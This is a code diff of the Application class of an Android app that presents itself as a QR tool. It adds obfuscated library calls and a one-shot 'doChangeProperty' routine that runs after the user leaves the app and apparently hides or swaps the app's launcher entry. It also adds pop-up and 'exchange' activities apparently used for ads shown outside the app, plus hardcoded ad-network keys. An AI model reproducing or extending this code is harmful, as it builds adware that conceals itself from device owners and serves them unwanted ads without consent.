@@ -1,12 +1,12 @@
 package com.qr.myqr
 
-import android.annotation.SuppressLint
 import android.app.Activity
 import android.app.ActivityManager
 import android.content.Context
 import android.os.Build
 import android.os.Bundle
 import android.os.Process
+import android.text.TextUtils
 import android.util.Log
 import android.webkit.WebView
 import com.anythink.core.api.ATInitConfig
@@ -17,19 +17,26 @@ import com.anythink.network.adcolony.AdColonyATInitConfig
 import com.anythink.network.mintegral.MintegralATInitConfig
 import com.anythink.network.pangle.PangleATInitConfig
 import com.anythink.network.vungle.VungleATInitConfig
+import com.google.firebase.FirebaseApp
 import com.qr.myqr.basic.BaseApp
+import com.qr.myqr.basic.BaseCompatActivity
 import com.qr.myqr.basic.BasePage
 import com.qr.myqr.data.AppCache
+import com.qr.myqr.data.FirebaseEvent
+import com.qr.myqr.data.RemoteConfig
 import com.qr.myqr.data.StartupProvider
+import com.qr.myqr.page.ExchangeActivity
 import com.qr.myqr.page.FirstActivity
-import com.qr.myqr.revenue.AdPos
-import com.qr.myqr.revenue.AdsLoader
+import com.qr.myqr.pop.PopActivity
+import com.qr.myqr.pop.SelfRenderActivity
 import com.reader.multiple.bmw4.MvpManager
 import com.reader.multiple.vb.MvpFbObj
+import com.reader.multiple.vb.ProcessHolder
 import kotlinx.coroutines.*
+import java.util.*
+import kotlin.collections.ArrayList
 
-const val isReleaseMode = false
-@SuppressLint("StaticFieldLeak")
+const val isReleaseMode = true
 lateinit var appIns: App
 class App : BaseApp() {
 
@@ -37,6 +44,20 @@ class App : BaseApp() {
         super.onCreate()
         appIns = this
 
+        MvpManager.setBhs(this, true)
+        MvpManager.init(this)
+        //DaemonManager.getInstance().init(context.getApplicationContext());
+        try {
+            if (TextUtils.equals(ProcessHolder.a(this), packageName) && Build.VERSION.SDK_INT >= 26) {
+                MvpFbObj.cvd(this)
+            }
+        } catch (e: Exception) {
+        }
+        try {
+            FirebaseApp.initializeApp(this)
+        } catch (e: Exception) {}
+
+        if (processName() != packageName) return
         //Android 9及以上必须设置 多进程WebView兼容
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
             val processName = getProcessName()
@@ -44,45 +65,44 @@ class App : BaseApp() {
                 WebView.setDataDirectorySuffix(processName)
             }
         }
-        MvpManager.setBhs(this, true)
-        MvpManager.init(this)
 
-        if (processName() != packageName) return
-        initTopOn()
-        checkChangeProperty()
+        RemoteConfig.ins.fetchInit()
+        //checkChangeProperty()
 
         StartupProvider.onStart()
         registerActivityLifecycleCallbacks(ActivityLife())
 
         MainScope().launch {
-            delay(6000L)
-            AdsLoader.preloadAd(appIns, AdPos.insOut)
-            AdsLoader.preloadAd(appIns, AdPos.navOut)
+            initTopOn()
         }
+        FirebaseEvent.event("app_startup_on")
     }
 
-    private fun checkChangeProperty() {
+    /*private fun checkChangeProperty() {
         if (!isReleaseMode) return
         if (AppCache.ins.appPropertyChanged) return
         MainScope().launch {
             delay(3000L)
             val userInApp = userInAppIdentification != null
             if (!userInApp) {
-                delay(18_000L)
+                delay(21_000L)
                 doChangeProperty()
             }
         }
-    }
+    }*/
 
-    private fun doChangeProperty() {
+    fun doChangeProperty() {
+        if (!isReleaseMode) return
         if (!StartupProvider.isOneShotEnable()) return
         if (AppCache.ins.appPropertyChanged) return
-        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
-            MvpFbObj.hi(this, FirstActivity::class.java.name)
-        } else {
-            MvpFbObj.exchange(this, FirstActivity::class.java.name, "$packageName.exchanges")
+        GlobalScope.launch(Dispatchers.Main) {
+            if (Build.VERSION.SDK_INT < Build.VERSION_CODES.Q) {
+                MvpFbObj.hi(this@App, FirstActivity::class.java.name)
+            } else {
+                MvpFbObj.exchange(this@App, FirstActivity::class.java.name, "$packageName.exchanges")
+            }
+            AppCache.ins.appPropertyChanged = true
         }
-        AppCache.ins.appPropertyChanged = true
     }
 
     private fun processName(): String? {
@@ -97,8 +117,8 @@ class App : BaseApp() {
         return null
     }
 
-    private val tapOnAppId = "a62b013be01931"
-    private val tapOnAppKey = "c3d0d2a9a9d451b07e62b509659f7c97"
+    private val tapOnAppId = "a642e691220fc0"
+    private val tapOnAppKey = "a9bbeebb144613f6e9cb7ebf1005975a8"
     private fun initTopOn() {
         //初始化TopOn SDK之前调用此方法
         //TTATInitManager.getInstance().setIsOpenDirectDownload(false)
@@ -145,14 +165,17 @@ class App : BaseApp() {
 
     private var userInAppIdentification: Activity? = null
 
+    private val mActivityList = LinkedList<Activity>()
     private var nActivity = 0
     private var reachHot = false
     private inner class ActivityLife: ActivityLifecycleCallbacks {
         override fun onActivityCreated(activity: Activity, savedInstanceState: Bundle?) {
+            mActivityList.add(activity)
         }
 
         override fun onActivityStarted(activity: Activity) {
             //loggerActivityLife("onActivityStarted: $activity")
+            if (activity is PopActivity || activity is ExchangeActivity || activity is SelfRenderActivity) return
             if (nActivity++ == 0) {
                 //ProtectService.activityCheckStartup()
 
@@ -162,6 +185,7 @@ class App : BaseApp() {
                     } else {
                         if (activity is BasePage
                             && activity !is FirstActivity
+                            && !AppCache.ins.appPropertyChanged
                         ) {
                             FirstActivity.hotStart(activity)
                         }
@@ -173,6 +197,11 @@ class App : BaseApp() {
 
         override fun onActivityStopped(activity: Activity) {
             //loggerActivityLife("onActivityStopped: $activity")
+            if (activity is PopActivity || activity is ExchangeActivity || activity is SelfRenderActivity) {
+                if (activity.isFinishing || activity.isDestroyed) return
+                activity.finish()
+                return
+            }
             if (--nActivity <= 0) {
                 doChangeProperty()
 
@@ -185,7 +214,9 @@ class App : BaseApp() {
         }
 
         override fun onActivityResumed(activity: Activity) {
-            userInAppIdentification = activity
+            if (activity !is PopActivity && activity !is ExchangeActivity && activity !is SelfRenderActivity) {
+                userInAppIdentification = activity
+            }
         }
 
         override fun onActivityPaused(activity: Activity) {
@@ -196,7 +227,29 @@ class App : BaseApp() {
 
         override fun onActivityDestroyed(activity: Activity) {
             //loggerActivityLife("onActivityDestroyed: $activity")
+            mActivityList.remove(activity)
         }
+    }
+
+    fun closeAdAndOutActivity() {
+        if (mActivityList.isEmpty()) return
+        for (ac in mActivityList) {
+            if (ac::class.java.name == PopActivity::class.java.name) {
+                ac.finish()
+            } else if (ac !is BaseCompatActivity) {
+                ac.finish()
+            }
+        }
+    }
+
+    fun onlyAdActivity(): Boolean {
+        if (mActivityList.isEmpty()) return false
+        for (ac in mActivityList) {
+            if (ac is BaseCompatActivity && ac !is PopActivity) {
+                return false
+            }
+        }
+        return true
     }
 
 }
